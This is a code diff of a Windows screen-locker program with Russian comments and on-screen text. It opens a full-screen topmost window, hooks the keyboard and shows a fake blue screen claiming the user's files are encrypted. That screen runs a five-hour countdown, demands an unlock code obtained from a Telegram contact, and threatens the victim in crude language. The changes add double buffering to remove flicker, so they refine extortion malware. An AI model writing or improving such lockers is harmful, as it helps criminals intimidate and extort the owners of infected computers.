@@ -44,7 +44,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     switch (msg) {
     case WM_CREATE:
         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-        SetTimer(hwnd, 1, 15, NULL); 
+        SetTimer(hwnd, 1, 30, NULL); 
         {
             wchar_t buf[256];
             DWORD size = 256;
@@ -55,28 +55,41 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         last_timer_tick = GetTickCount();
         return 0;
 
+    // Убираем заливку фона Windows, чтобы не было мерцания при перерисовке
+    case WM_ERASEBKGND:
+        return 1;
+
     case WM_TIMER:
+        // Анимация печати
         if (!is_bsod && typed_chars < full_log_text.length()) {
             typed_chars += 2; 
             if (typed_chars > full_log_text.length()) typed_chars = full_log_text.length();
-            InvalidateRect(hwnd, NULL, TRUE);
+            InvalidateRect(hwnd, NULL, FALSE); // FALSE убирает мерцание
         }
+        // Переход на BSOD
         if (!is_bsod && GetTickCount() - start_time > 5000) {
             is_bsod = true;
-            InvalidateRect(hwnd, NULL, TRUE);
+            InvalidateRect(hwnd, NULL, FALSE);
         }
+        
+        // Обновляем таймер только раз в секунду
         if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
             if (time_left > 0) time_left--;
             last_timer_tick = GetTickCount();
+            InvalidateRect(hwnd, NULL, FALSE);
         }
         
-        if (is_bsod) {
-            InvalidateRect(hwnd, NULL, TRUE);
+        // Мигающий Enter обновляем только когда он меняет состояние (раз в 500мс)
+        static DWORD last_blink = 0;
+        if (is_bsod && GetTickCount() - last_blink > 500) {
+            last_blink = GetTickCount();
+            InvalidateRect(hwnd, NULL, FALSE);
         }
 
+        // Таймаут ошибки
         if (show_error && GetTickCount() - error_time > 3000) {
             show_error = false;
-            InvalidateRect(hwnd, NULL, TRUE);
+            InvalidateRect(hwnd, NULL, FALSE);
         }
         return 0;
 
@@ -95,45 +108,51 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             } else if (wp >= 32 && wp <= 126 && input_text.length() < 15) {
                 input_text += (wchar_t)wp;
             }
-            InvalidateRect(hwnd, NULL, TRUE);
+            InvalidateRect(hwnd, NULL, FALSE);
         }
         return 0;
 
     case WM_PAINT: {
         PAINTSTRUCT ps;
         HDC hdc = BeginPaint(hwnd, &ps);
+        
+        // Двойная буферизация для полного устранения мерцания
+        HDC memDC = CreateCompatibleDC(hdc);
         RECT rect;
         GetClientRect(hwnd, &rect);
+        HBITMAP memBM = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
+        SelectObject(memDC, memBM);
+        
         int cx = rect.right / 2;
         int cy = rect.bottom / 2;
         
         if (!is_bsod) {
             // --- СЦЕНА 1 ---
-            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
-            SetBkMode(hdc, TRANSPARENT);
+            FillRect(memDC, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
+            SetBkMode(memDC, TRANSPARENT);
             
             HFONT fontSmall = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, fontSmall);
+            SelectObject(memDC, fontSmall);
             
-            SetTextColor(hdc, RGB(255, 0, 0));
+            SetTextColor(memDC, RGB(255, 0, 0));
             std::wstring current_text = full_log_text.substr(0, typed_chars);
             if (typed_chars < full_log_text.length() || (GetTickCount() / 300) % 2 == 0) {
                 current_text += L"_";
             }
             
             RECT errRect = {10, 10, 800, 600};
-            DrawTextW(hdc, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
+            DrawTextW(memDC, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
             
             HFONT fontEye = CreateFontW(120, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
-            SelectObject(hdc, fontEye);
-            SetTextColor(hdc, RGB(255, 255, 255));
+            SelectObject(memDC, fontEye);
+            SetTextColor(memDC, RGB(255, 255, 255));
             RECT eyeRect = {cx - 200, cy - 100, cx + 200, cy + 100};
-            DrawTextW(hdc, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
+            DrawTextW(memDC, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
             
             HFONT fontLarge = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, fontLarge);
+            SelectObject(memDC, fontLarge);
             RECT titleRect = {cx - 300, cy + 80, cx + 300, cy + 150};
-            DrawTextW(hdc, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);
+            DrawTextW(memDC, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);
 
             DeleteObject(fontSmall);
             DeleteObject(fontEye);
@@ -141,29 +160,29 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         } else {
             // --- СЦЕНА 2: BSOD ---
             HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 170));
-            FillRect(hdc, &rect, blueBrush);
+            FillRect(memDC, &rect, blueBrush);
             DeleteObject(blueBrush);
             
-            SetBkMode(hdc, TRANSPARENT);
+            SetBkMode(memDC, TRANSPARENT);
             HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, font);
+            SelectObject(memDC, font);
 
             // Верхняя плашка
             RECT whiteRect = {cx - 400, cy - 250, cx + 400, cy - 220};
             HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
-            FillRect(hdc, &whiteRect, whiteBrush);
+            FillRect(memDC, &whiteRect, whiteBrush);
             DeleteObject(whiteBrush);
-            SetTextColor(hdc, RGB(0, 0, 0));
-            DrawTextW(hdc, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
+            SetTextColor(memDC, RGB(0, 0, 0));
+            DrawTextW(memDC, L"\u0412\u0430\u0448\u0438 \u0444\u0430\u0439\u043b\u044b \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b!", -1, &whiteRect, DT_CENTER | DT_VCENTER);
             
-            // Рамка вокруг основного текста (как на референсе)
+            // Рамка вокруг текста
             RECT frameRect = {cx - 400, cy - 200, cx + 400, cy + 80};
             HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
-            FrameRect(hdc, &frameRect, frameBrush);
+            FrameRect(memDC, &frameRect, frameBrush);
             DeleteObject(frameBrush);
 
-            // Основной текст (внутри рамки, с отступами)
-            SetTextColor(hdc, RGB(255, 255, 255));
+            // Основной текст
+            SetTextColor(memDC, RGB(255, 255, 255));
             RECT textRect = {cx - 390, cy - 190, cx + 390, cy + 70};
             const wchar_t* bsod_text = 
                 L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
@@ -176,35 +195,34 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
                 L"\u0423 \u0432\u0430\u0441 \u0435\u0441\u0442\u044c 5 \u0447\u0430\u0441\u043e\u0432 \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0437\u0430\u043f\u0443\u0441\u043a\u0430 \u0447\u0442\u043e\u0431\u044b \u0432\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0434,\n"
                 L"\u0447\u0442\u043e \u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434, \u043d\u0430\u043f\u0438\u0448\u0438               @opka8       (Telegram)";
             
-            DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
+            DrawTextW(memDC, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
-            // Поле ввода (Сдвинуто ниже, чтобы не налезало на красный текст)
+            // Поле ввода
             RECT inputRect = {cx - 400, cy + 100, cx + 400, cy + 130};
             HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
-            FillRect(hdc, &inputRect, inputBrush);
+            FillRect(memDC, &inputRect, inputBrush);
             DeleteObject(inputBrush);
-            SetTextColor(hdc, RGB(0, 0, 0));
+            SetTextColor(memDC, RGB(0, 0, 0));
             
             std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
-            DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
+            DrawTextW(memDC, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Красный текст (теперь он под полем ввода, с отступом)
+            // Красный текст
             HFONT fontWarning = CreateFontW(16, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, fontWarning);
-            SetTextColor(hdc, RGB(255, 50, 50)); // Ярко-красный
+            SelectObject(memDC, fontWarning);
+            SetTextColor(memDC, RGB(255, 50, 50));
             RECT warnRect = {cx - 400, cy + 140, cx + 400, cy + 160};
-            DrawTextW(hdc, L"\u0415\u0441\u043b\u0438 \u0442\u044b \u0431\u0443\u0434\u0435\u0448\u044c \u043f\u044b\u0442\u0430\u0442\u044c\u0441\u044f \u0443\u0433\u0430\u0434\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043f\u0438\u0437\u0434\u0430 \u0442\u0432\u043e\u0435\u0439 \u0432\u0438\u043d\u0434\u0435 \u043e\u043b\u0443\u0445 \u0443 \u0442\u0435\u0431\u044f 3 \u043f\u043e\u043f\u044b\u0442\u043a\u0438", -1, &warnRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            DrawTextW(memDC, L"\u0415\u0441\u043b\u0438 \u0442\u044b \u0431\u0443\u0434\u0435\u0448\u044c \u043f\u044b\u0442\u0430\u0442\u044c\u0441\u044f \u0443\u0433\u0430\u0434\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c \u043f\u0438\u0437\u0434\u0430 \u0442\u0432\u043e\u0435\u0439 \u0432\u0438\u043d\u0434\u0435 \u043e\u043b\u0443\u0445 \u0443 \u0442\u0435\u0431\u044f 3 \u043f\u043e\u043f\u044b\u0442\u043a\u0438", -1, &warnRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
             
-            // Возвращаем основной шрифт
-            SelectObject(hdc, font);
+            SelectObject(memDC, font);
 
-            // Имя ПК (снизу слева, под красным текстом)
-            SetTextColor(hdc, RGB(255, 255, 255));
+            // Имя ПК
+            SetTextColor(memDC, RGB(255, 255, 255));
             RECT bottomRect = {cx - 400, cy + 170, cx, cy + 190};
             std::wstring bottom = L"Current PC: " + pc_name;
-            DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
+            DrawTextW(memDC, bottom.c_str(), -1, &bottomRect, DT_LEFT);
 
-            // ОГРОМНЫЙ БЕЛЫЙ ТАЙМЕР (снизу по центру)
+            // Таймер
             int hrs = time_left / 3600;
             int mins = (time_left % 3600) / 60;
             int secs = time_left % 60;
@@ -212,39 +230,45 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             swprintf_s(timer_buf, L"\u041e\u0421\u0422\u0410\u041b\u041e\u0421\u042c \u0412\u0420\u0415\u041c\u0415\u041d\u0418: %02d:%02d:%02d", hrs, mins, secs);
             
             HFONT fontTimer = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-            SelectObject(hdc, fontTimer);
-            SetTextColor(hdc, RGB(255, 255, 255)); // Белый цвет
+            SelectObject(memDC, fontTimer);
+            SetTextColor(memDC, RGB(255, 255, 255));
             RECT timerRect = {cx - 400, rect.bottom - 120, cx + 400, rect.bottom - 40};
-            DrawTextW(hdc, timer_buf, -1, &timerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            DrawTextW(memDC, timer_buf, -1, &timerRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
 
-            // МИГАЮЩИЙ ENTER (снизу справа, под красным текстом)
+            // Мигающий Enter
             if ((GetTickCount() / 500) % 2 == 0) {
                 HFONT fontEnter = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
-                SelectObject(hdc, fontEnter);
-                SetTextColor(hdc, RGB(255, 255, 255));
+                SelectObject(memDC, fontEnter);
+                SetTextColor(memDC, RGB(255, 255, 255));
                 RECT enterRect = {cx, cy + 170, cx + 400, cy + 190};
-                DrawTextW(hdc, L"Enter [\u0412\u0412\u041e\u0414]", -1, &enterRect, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
+                DrawTextW(memDC, L"Enter [\u0412\u0412\u041e\u0414]", -1, &enterRect, DT_RIGHT | DT_VCENTER | DT_SINGLELINE);
                 DeleteObject(fontEnter);
             }
 
-            // Окно ошибки
+            // Статичное окно ошибки (без анимаций и изменения размера)
             if (show_error) {
                 RECT errRect = {cx - 300, cy - 50, cx + 300, cy + 50};
                 HBRUSH redBrush = CreateSolidBrush(RGB(170, 0, 0)); 
-                FillRect(hdc, &errRect, redBrush);
+                FillRect(memDC, &errRect, redBrush);
                 DeleteObject(redBrush);
                 
                 HBRUSH frameBrush = CreateSolidBrush(RGB(255, 255, 255));
-                FrameRect(hdc, &errRect, frameBrush);
+                FrameRect(memDC, &errRect, frameBrush);
                 DeleteObject(frameBrush);
 
-                SetTextColor(hdc, RGB(255, 255, 255));
-                DrawTextW(hdc, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430 \u043e\u0431\u043c\u0430\u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u044b!", -1, &errRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+                SetTextColor(memDC, RGB(255, 255, 255));
+                DrawTextW(memDC, L"\u0417\u0430\u043c\u0435\u0447\u0435\u043d\u0430 \u043f\u043e\u043f\u044b\u0442\u043a\u0430 \u043e\u0431\u043c\u0430\u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u044b!", -1, &errRect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
             }
             DeleteObject(font);
             DeleteObject(fontWarning);
             DeleteObject(fontTimer);
         }
+        
+        // Копируем всё на экран разом
+        BitBlt(hdc, 0, 0, rect.right, rect.bottom, memDC, 0, 0, SRCCOPY);
+        
+        DeleteObject(memBM);
+        DeleteDC(memDC);
         EndPaint(hwnd, &ps);
         return 0;
     }
@@ -262,7 +286,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     wc.hInstance = hInst;
     wc.lpszClassName = L"LockerClass";
     RegisterClassW(&wc);
-    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
+    
+    // Добавлен WS_EX_COMPOSITED для сглаживания мерцания на уровне окон
+    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_COMPOSITED, L"LockerClass", L"System", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);
     ShowWindow(hwnd, SW_SHOW);
     MSG msg;
     while (GetMessageW(&msg, NULL, 0, 0)) {
